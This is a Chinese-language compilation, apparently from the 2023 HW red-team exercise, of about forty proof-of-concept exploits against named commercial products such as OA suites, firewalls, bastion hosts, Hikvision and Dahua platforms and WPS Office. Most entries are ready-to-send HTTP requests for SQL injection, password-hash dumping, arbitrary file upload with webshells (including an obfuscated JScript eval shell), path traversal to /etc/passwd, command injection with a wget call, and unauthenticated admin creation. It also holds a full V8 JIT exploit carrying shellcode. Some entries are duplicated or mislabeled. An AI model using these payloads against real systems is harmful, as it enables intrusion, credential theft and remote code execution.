# Hvv2023

### 1、某神 SecSSL 3600安全接入网关系统 任意密码修改漏洞
POC
POST /changepass.php?type=2 

Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"test","subAuthId":"1"}
old_pass=&password=Test123!@&repassword=Test123!@

### 2、某神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞
POST /?g=obj_app_upfile HTTP/1.1
Host: x.x.x.x
Accept: /
Accept-Encoding: gzip, deflate
Content-Length: 574
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="upfile"; filename="vulntest.php"
Content-Type: text/plain

<?php php马?>

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

obj_app_upfile
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="__hash__"

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundaryJpMyThWnAxbcBBQc--

马儿路径：attachements/xxx.php

### 3、某达OA sql注入漏洞 CVE-2023-4166
```
GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```
### 4、某达OA sql注入漏洞 CVE-2023-4165  POC

GET /general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

### 5、某x服应用交付系统命令执行漏洞 POC

POST /rep/login
Host:10.10.10.1:85

clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123

### 6、某联达oa sql注入漏洞 POC

POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
Host: xxx.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: 
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 88

dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --

### 7、某服 sxf-报表系统 版本有限制

POC

POST /rep/login HTTP/1.1 
Host: URL
Cookie: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0 
Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif, image/webp,*/*;q=0.8 Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2 
Accept-Encoding: gzip deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: cross-site Pragma: no-cache Cache-Control: no-cache14 Te: trailers 
Connection: close 
Content-Type:application/x-www-form-urlencoded 
Content-Length: 126 clsMode=cls_mode_login&index=index&log_type=report&page=login&rnd=0.7550103466497915&userID=admin%0Aid -a %0A&userPsw=tmbhuisq

### 8、某盟sas安全审计系统任意文件读取漏洞POC

/webconf/GetFile/indexpath=../../../../../../../../../../../../../../etc/passwd

### 9、某凌OA前台代码执行

POC EXP

POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: www.ynjd.cn:801
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: /
Connection: Keep-Alive
Content-Length: 42
Content-Type: application/x-www-form-urlencoded
var={"body":{"file":"file:///etc/passwd"}}

### 10、金山WPS RCE

wps影响范围为：WPS Office 2023 个人版 < 11.1.0.15120
WPS Office 2019 企业版 < 11.8.2.12085
POC
在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的） 
127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn

漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn cloudwps.cn和wps.cn没有任何关系
代码块在底下。（需要原pdf加wechat）
<script>
if(typeof alert === "undefined"){
alert = console.log;
}
let f64 = new Float64Array(1);
let u32 = new Uint32Array(f64.buffer);
function d2u(v) {
f64[0] = v;
return u32;
}
function u2d(lo, hi) {
u32[0] = lo;
u32[1] = hi;
return f64[0];
}
function gc(){ // major
for (let i = 0; i < 0x10; i++) {
new Array(0x100000);
}
}
function foo(bug) {
function C(z) {
Error.prepareStackTrace = function(t, B) {
return B[z].getThis();
};
let p = Error().stack;
Error.prepareStackTrace = null;
return p;
}
function J() {}
var optim = false;
var opt = new Function(
'a', 'b', 'c',
'if(typeof a===\'number\'){if(a>2){for(var
i=0;i<100;i++);return;}b.d(a,b,1);return}' +
'g++;'.repeat(70));
var e = null;
J.prototype.d = new Function(
'a', 'b', '"use strict";b.a.call(arguments,b);return arguments[a];');
J.prototype.a = new Function('a', 'a.b(0,a)');
J.prototype.b = new Function(
'a', 'b',
'b.c();if(a){' +
'g++;'.repeat(70) + '}');
J.prototype.c = function() {
if (optim) {
var z = C(3);
var p = C(3);
z[0] = 0;
e = {M: z, C: p};
}
};
var a = new J();
// jit optim
if (bug) {
for (var V = 0; 1E4 > V; V++) {
opt(0 == V % 4 ? 1 : 4, a, 1);
}
}
optim = true;
opt(1, a, 1);
return e;
}
e1 = foo(false);
e2 = foo(true);
delete e2.M[0];
let hole = e2.C[0];
let map = new Map();
map.set('asd', 8);
map.set(hole, 0x8);
map.delete(hole);
map.delete(hole);
map.delete("asd");
map.set(0x20, "aaaa");
let arr3 = new Array(0);
let arr4 = new Array(0);
let arr5 = new Array(1);
let oob_array = [];
oob_array.push(1.1);
map.set("1", -1);
let obj_array = {
m: 1337, target: gc
};
let ab = new ArrayBuffer(1337);
let object_idx = undefined;
let object_idx_flag = undefined;
let max_size = 0x1000;
for (let i = 0; i < max_size; i++) {
if (d2u(oob_array[i])[0] === 0xa72) {
object_idx = i;
object_idx_flag = 1;
break;
}if (d2u(oob_array[i])[1] === 0xa72) {
object_idx = i + 1;
object_idx_flag = 0;
break;
}
}
function addrof(obj_para) {
obj_array.target = obj_para;
let addr = d2u(oob_array[object_idx])[object_idx_flag] - 1;
obj_array.target = gc;
return addr;
}
function fakeobj(addr) {
let r8 = d2u(oob_array[object_idx]);
if (object_idx_flag === 0) {
oob_array[object_idx] = u2d(addr, r8[1]);
}else {
oob_array[object_idx] = u2d(r8[0], addr);
}
return obj_array.target;
}
let bk_idx = undefined;
let bk_idx_flag = undefined;
for (let i = 0; i < max_size; i++) {
if (d2u(oob_array[i])[0] === 1337) {
bk_idx = i;
bk_idx_flag = 1;
break;
}if (d2u(oob_array[i])[1] === 1337) {
bk_idx = i + 1;
bk_idx_flag = 0;
break;
}
}
let dv = new DataView(ab);
function get_32(addr) {
let r8 = d2u(oob_array[bk_idx]);
if (bk_idx_flag === 0) {
oob_array[bk_idx] = u2d(addr, r8[1]);
} else {
oob_array[bk_idx] = u2d(r8[0], addr);
}
let val = dv.getUint32(0, true);
oob_array[bk_idx] = u2d(r8[0], r8[1]);
return val;
}
function set_32(addr, val) {
let r8 = d2u(oob_array[bk_idx]);
if (bk_idx_flag === 0) {
oob_array[bk_idx] = u2d(addr, r8[1]);
} else {
oob_array[bk_idx] = u2d(r8[0], addr);
}
dv.setUint32(0, val, true);
oob_array[bk_idx] = u2d(r8[0], r8[1]);
}
function write8(addr, val) {
let r8 = d2u(oob_array[bk_idx]);
if (bk_idx_flag === 0) {
oob_array[bk_idx] = u2d(addr, r8[1]);
} else {
oob_array[bk_idx] = u2d(r8[0], addr);
}
dv.setUint8(0, val);
}
let fake_length = get_32(addrof(oob_array)+12);
set_32(get_32(addrof(oob_array)+8)+4,fake_length);
let wasm_code = new
Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,
128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,
128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0
,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasm_mod = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_mod);
let f = wasm_instance.exports.main;
let target_addr = addrof(wasm_instance)+0x40;
let rwx_mem = get_32(target_addr);
//alert("rwx_mem is"+rwx_mem.toString(16));
const shellcode = new Uint8Array([0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,
0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14,
0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,0xac, 0x3c, 0x61, 0x7c,
0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,0x57, 0x8b,
0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01,
0xd1,0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,
0x8b, 0x34, 0x8b,0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
0x38, 0xe0, 0x75, 0xf6, 0x03,0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58,
0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01,
0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,0x24, 0x5b, 0x5b, 0x61,
0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,0x8d, 0x5d,
0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b,
0x6f,0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x68, 0xa6, 0x95, 0xbd,
0x9d, 0xff, 0xd5,0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
0x47, 0x13, 0x72, 0x6f, 0x6a,0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63,
0x00]);
for(let i=0;i<shellcode.length;i++){
write8(rwx_mem+i,shellcode[i]);
}
f();
</script>

### 11、汉得SRM tomcat.jsp 登录绕过漏洞 POC

/tomcat.jsp?dataName=role_id&dataValue=1
/tomcat.jsp?dataName=user_id&dataValue=1

然后访问后台：/main.screen

### 12、某联达oa 后台文件上传漏洞 POC

POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1
Host: 10.10.10.1:8888
X-Requested-With: Ext.basex
Accept: text/html, application/xhtml+xml, image/jxr, /
Accept-Language: zh-Hans-CN,zh-Hans;q=0.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
Accept: /
Origin: http://10.10.10.1
Referer: http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-42ec-9e27-caeaa699f512&menuitemid=120743&frame=1&modulecode=GTP.Workflow.TaskCenterModule&tabID=40
Cookie: 
Connection: close
Content-Length: 421

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"
Content-Type: application/text

<%@ Page Language="Jscript" Debug=true%>
<%
var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD';
var GFMA=Request.Form("qmq1");
var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1);
eval(GFMA, ONOQ);
%>

------WebKitFormBoundaryFfJZ4PlAZBixjELj--

### 13、某联达oa sql注入漏洞 POC

POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
Host: xxx.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: 
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 88

dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --

### 14、某微E-Office9文件上传漏洞 CVE-2023-2648 POC

POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 192.168.233.10:8082
User-Agent: test
Connection: close
Content-Length: 493
Accept-Encoding: gzip
Content-Type: multipart/form-data

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="Filedata"; filename="666.php"
Content-Type: application/octet-stream

<?php phpinfo();?>

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt

### 15、某微E-Office9文件上传漏洞 CVE-2023-2523 POC

POST/Emobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1 
Host:192.168.233.10:8082  
Cache-Control:max-age=0  
Upgrade-Insecure-Requests:1  
Origin:null  
Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt  
Accept-Encoding:gzip, deflate
Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection:close

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition:form-data; name="upload_quwan"; filename="1.php."
Content-Type:image/jpeg
<?phpphpinfo();?>
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt

### 16、某信景云终端安全管理系统 login SQL注入漏洞 POC

POST /api/user/login

captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(3))a)='

### 17、某恒明御运维审计与风险控制系统堡垒机任意用户注册

POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
Host: xxx
Cookie: LANG=zh; USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 1121

<?xml version="1.0"?>
<methodCall>
<methodName>web.user_add</methodName>
<params>
<param>
<value>
<array>
<data>
<value>
<string>admin</string>
</value>
<value>
<string>5</string>
</value>
<value>
<string>XX.XX.XX.XX</string>
</value>
</data>
</array>
</value>
</param>
<param>
<value>
<struct>
<member>
<name>uname</name>
<value>
<string>deptadmin</string>
</value>
</member>
<member>
<name>name</name>
<value>
<string>deptadmin</string>
</value>
</member>
<member>
<name>pwd</name>
<value>
<string>Deptadmin@123</string>
</value>
</member>
<member>
<name>authmode</name>
<value>
<string>1</string>
</value>
</member>
<member>
<name>deptid</name>
<value>
<string></string>
</value>
</member>
<member>
<name>email</name>
<value>
<string></string>
</value>
</member>
<member>
<name>mobile</name>
<value>
<string></string>
</value>
</member>
<member>
<name>comment</name>
<value>
<string></string>
</value>
</member>
<member>
<name>roleid</name>
<value>
<string>101</string>
</value>
</member>
</struct></value>
</param>
</params>
</methodCall>

### 18、HiKVISION 综合安防管理平台 report 任意文件上传漏洞 POC

POST /svm/api/external/report HTTP/1.1
Host: 10.10.10.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%jsp的马%>

------WebKitFormBoundary9PggsiM755PLa54a--

马儿路径：/portal/ui/login/..;/..;/new.jsp

### 19、HiKVISION 综合安防管理平台 files 任意文件上传漏洞 POC

POST /center/api/files;.html HTTP/1.1
Host: 10.10.10.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%jsp的马%>
------WebKitFormBoundary9PggsiM755PLa54a--

### 20、Exchange Server远程代码执行漏洞（CVE-2023-38182）风险通告 

待补充poc exp
描述和影响范围
Exchange Server 2019 Cumulative Update 13
Exchange Server 2019 Cumulative Update 12
Exchange Server 2019 Cumulative Update 11
Exchange Server 2016 Cumulative Update 23
需要有普通用户权限

### 22、某微 E-Cology 某版本 SQL注入漏洞 POC

POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
Host: ip:port 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Connection: close 

Content-Length: 189
Content-Type: text/plain
Accept-Encoding: gzip

callCount=1
page=
httpSessionId=
scriptSessionId=
c0-scriptName=DocDwrUtil
c0-methodName=ifNewsCheckOutByCurrentUser
c0-id=0
c0-param0=string:1 AND 1=1
c0-param1=string:1
batchId=0

### 23、某和OA C6-GetSqlData.aspx SQL注入漏洞 POC

POST /C6/Control/GetSqlData.aspx/.ashx
Host: ip:port 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Connection: close
Content-Length: 189
Content-Type: text/plain
Accept-Encoding: gzip

exec master..xp_cmdshell 'ipconfig'

### 24、大华智慧园区综合管理平台 searchJson SQL注入漏洞 POC

GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
Host: 127.0.0.1:7443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close

### 25、大华智慧园区综合管理平台 文件上传漏洞 POC

POST /publishing/publishing/material/file/video HTTP/1.1
Host: 127.0.0.1:7443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 804
Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
Accept-Encoding: gzip, deflate
Connection: close

--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Filedata"; filename="0EaE10E7dF5F10C2.jsp"

<%@page contentType="text/html; charset=GBK"%><%@page import="java.math.BigInteger"%><%@page import="java.security.MessageDigest"%><% MessageDigest md5 = null;md5 = MessageDigest.getInstance("MD5");String s = "123456";String miyao = "";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="poc"

poc
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Submit"

submit
--dd8f988919484abab3816881c55272a7--

### 26、某友时空KSOA PayBill SQL注入漏洞 POC

POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 134
Accept-Encoding: gzip, deflate
Connection: close

<?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:03';-</name><name>1</name><name>102360</name></root>

### 27、某盟 SAS堡垒机 local_user.php 任意用户登录漏洞 POC

GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close

### 28、某盟 SAS堡垒机 GetFile 任意文件读取漏洞 POC

GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

### 29、某盟 SAS堡垒机 Exec 远程命令执行漏洞 POC

GET /webconf/Exec/index?cmd=wget%20xxx.xxx.xxx HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
### 30、某友 移动管理系 统 uploadApk.do 任意文件上传漏洞

POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1 Host: Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO 3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,im age/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server Connection: close ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3 Content-Disposition:form-data;name="downloadpath"; filename="a.jsp" Content-Type: application/msword
hello ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--

### 31、启明天钥安全网关前台sql注入

POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
Host: ****
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Language: zh-CN,zh;q=0.9
Cookie: ****
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
checkname=123&tagid=123


sqlmap -u "https://****/ops/index.php?c=Reportguide&a=checkrn" --data "checkname=123&tagid=123" -v3 --skip-waf --random-agent

### 32、用友M1server反序列化命令执行漏洞）

漏洞描述：
M1移动协同是针对管理者、高端商务人士、长期在外走访客户的业务人员以及日常外出的行业者而打造的协同应用。该应用平台存在反序列化漏洞，攻击者构造恶意包可以执行任意命令获取服务器权限
POC待补充
### 33、启明星辰-4A 统一安全管控平台 getMater 信息泄漏

漏洞描述：
启明星辰集团4A统一安全管控平台实现IT资源集中管理,为企业提供集中的账号、认证、授权、审计管理技术支撑及配套流程,提升系统安全性和可管理能力。可获取相关人员敏感信息。

poc:
  relative: req0
  session: false
  requests:
  - method: GET
    timeout: 10
    path: /accountApi/getMaster.do
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/65.0.881.36 Safari/537.36
    follow_redirects: true
    matches: (code.eq("200") && body.contains("\"state\":true"))
修复建议：
限制文件访问
### 34、锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露

漏洞描述：锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露漏洞
批量扫描工具：https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BAWEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FEXCU_SHELL
GET /EXCU_SHELL HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2852.74 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: /
Connection: close
Cmdnum: '1'
Command1: show running-config
Confirm1: n

### 35、科荣 AIO 管理系统存在文件读取漏洞

漏洞描述：
科荣AIO企业一体化管理解决方案,通过ERP（进销存财务）、OA（办公自动化）、CRM（客户关系管理）、UDP（自定义平台），集电子商务平台、支付平台、ERP平台、微信平台、移动APP等解决了众多企业客户在管理过程中跨部门、多功能、需求多变等通用及个性化的问题。科荣 AIO 管理系统存在文件读取漏洞，攻击者可以读取敏感文件。
POC待补充
### 36、飞企互联 FE 业务协作平台 magePath 参数文件读取漏洞

漏洞描述：
FE 办公协作平台是实现应用开发、运行、管理、维护的信息管理平台。飞企互联 FE 业务协作平台存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件获取大量敏感信息。
POC待补充
### 37、用友GRP-U8存在信息泄露
漏洞描述：友U8系统存可直接访问log日志，泄露敏感信息
批量扫描工具:https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E7%94%A8%E5%8F%8BGRP-U8
GET /logs/info.log HTTP/1.1

### 38、nginx配置错误导致的路径穿越风险

漏洞自查PoC如下：
https://github.com/hakaioffsec/navgix
该漏洞非0day，是一个路径穿越漏洞，可以直接读取nginx后台服务器文件。
有多家重点金融企业已中招，建议尽快进行自查。

### 39、红帆 oa 注入

POC：

POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1
Host: 10.250.250.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 383
Content-Type: text/xml; charset=utf-8
Soapaction: "http://tempuri.org/GetFileAtt"
Accept-Encoding: gzip, deflate
Connection: close
<?xml version="1.0" encoding="utf-8"?><soap:Envelope
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFileAtt
xmlns="http://tempuri.org/"><fileName>123</fileName></GetFileAtt> </soap:Body></so
ap:Envelope>

### 40、Coremail 邮件系统未授权访问获取管理员账密

POC：
/coremail/common/assets/:/:/:/:/:/:/s?
biz=Mzl3MTk4NTcyNw==&mid=2247485877&idx=1&sn=7e5f77db320ccf9013c0b7aa7262
